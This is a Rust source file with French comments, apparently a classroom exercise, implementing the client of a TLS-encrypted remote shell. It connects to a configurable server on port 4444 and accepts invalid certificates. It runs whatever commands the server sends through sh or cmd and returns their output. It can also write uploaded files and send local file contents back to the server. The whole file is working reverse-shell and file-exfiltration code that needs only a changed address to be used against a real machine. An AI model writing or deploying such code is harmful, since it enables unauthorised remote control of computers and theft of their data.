use std::io::{Write, BufRead, BufReader}; // On a enlevé Read
use std::net::TcpStream;
use std::process::Command; // On a enlevé Stdio
use std::path::Path;
use std::{env, fs};
use native_tls::TlsConnector;

// Configuration de la connexion (À changer pour votre démo)
const SERVER_IP: &str = "127.0.0.1";
const SERVER_PORT: &str = "4444";

fn main() {
    println!("Démarrage du client Remote Shell...");

    let connector = TlsConnector::builder()
        .danger_accept_invalid_certs(true) 
        .build()
        .unwrap();

    match TcpStream::connect(format!("{}:{}", SERVER_IP, SERVER_PORT)) {
        Ok(stream) => {
            println!("Connecté à {}:{}", SERVER_IP, SERVER_PORT);
            
            match connector.connect(SERVER_IP, stream) {
                Ok(mut stream) => {
                    println!("Tunnel TLS sécurisé établi.");
                    
                    // On enveloppe le stream dans un Reader pour lire ligne par ligne
                    let mut reader = BufReader::new(stream);
                    let mut buffer = String::new();

                    loop {
                        buffer.clear();
                        match reader.read_line(&mut buffer) {
                            Ok(n) => {
                                if n == 0 { break; } // Connexion fermée par le serveur
                                let cmd_line = buffer.trim().to_string();
                                
                                // --- CORRECTION ICI ---
                                // Au lieu de cloner et lancer un thread, on récupère 
                                // une référence mutable au stream TLS directement depuis le reader.
                                let output_stream = reader.get_mut();
                                
                                process_command(cmd_line, output_stream);
                            }
                            Err(e) => {
                                eprintln!("Erreur de lecture: {}", e);
                                break;
                            }
                        }
                    }
                },
                Err(e) => eprintln!("Erreur lors du handshake TLS: {}", e),
            }
        },
        Err(e) => eprintln!("Impossible de se connecter: {}", e),
    }
}

/// Fonction centrale qui analyse et exécute les ordres
fn process_command(cmd_line: String, stream: &mut native_tls::TlsStream<TcpStream>) {
    let parts: Vec<&str> = cmd_line.split_whitespace().collect();
    if parts.is_empty() { return; }

    let command = parts[0];
    let args = &parts[1..];

    match command {
        "cd" => {
            // Changement de répertoire (commande interne au shell)
            let new_dir = if args.is_empty() { "/" } else { args[0] };
            let root = Path::new(new_dir);
            if let Err(e) = env::set_current_dir(&root) {
                let _ = stream.write_all(format!("Erreur CD: {}\n", e).as_bytes());
            } else {
                let _ = stream.write_all(b"Repertoire change.\n");
            }
        },
        "upload" => {
            // Syntaxe attendue: upload <contenu_en_base64_ou_texte> <nom_fichier>
            // Pour simplifier ce TP, on écrit juste du texte dans un fichier.
            if args.len() >= 2 {
                let filename = args[args.len()-1];
                let content = args[0..args.len()-1].join(" ");
                if let Err(e) = fs::write(filename, content) {
                    let _ = stream.write_all(format!("Erreur Upload: {}\n", e).as_bytes());
                } else {
                    let _ = stream.write_all(b"Fichier uploade avec succes.\n");
                }
            }
        },
        "download" => {
            // Syntaxe attendue: download <nom_fichier>
            if let Some(filename) = args.get(0) {
                match fs::read_to_string(filename) {
                    Ok(content) => {
                        let _ = stream.write_all(format!("Content of {}:\n{}\n", filename, content).as_bytes());
                    },
                    Err(e) => {
                        let _ = stream.write_all(format!("Erreur Download: {}\n", e).as_bytes());
                    }
                }
            }
        },
        "exit" => {
            let _ = stream.write_all(b"Fermeture.\n");
            std::process::exit(0);
        },
        _ => {
            // Exécution d'une commande système (OS)
            execute_os_command(command, args, stream);
        }
    }
}

/// Exécute une commande système selon l'OS (Windows ou Linux)
fn execute_os_command(cmd: &str, args: &[&str], stream: &mut native_tls::TlsStream<TcpStream>) {
    
    // Détection de l'OS à la compilation
    #[cfg(target_os = "windows")]
    let (shell, flag) = ("cmd", "/C");
    
    #[cfg(not(target_os = "windows"))]
    let (shell, flag) = ("sh", "-c");

    // Reconstruction de la commande complète
    let full_cmd = format!("{} {}", cmd, args.join(" "));

    let output = Command::new(shell)
        .args(&[flag, &full_cmd])
        .output();

    match output {
        Ok(output) => {
            // On renvoie stdout (succès) et stderr (erreurs)
            let _ = stream.write_all(&output.stdout);
            let _ = stream.write_all(&output.stderr);
        },
        Err(e) => {
            let _ = stream.write_all(format!("Erreur d'execution: {}\n", e).as_bytes());
        }
    }
}



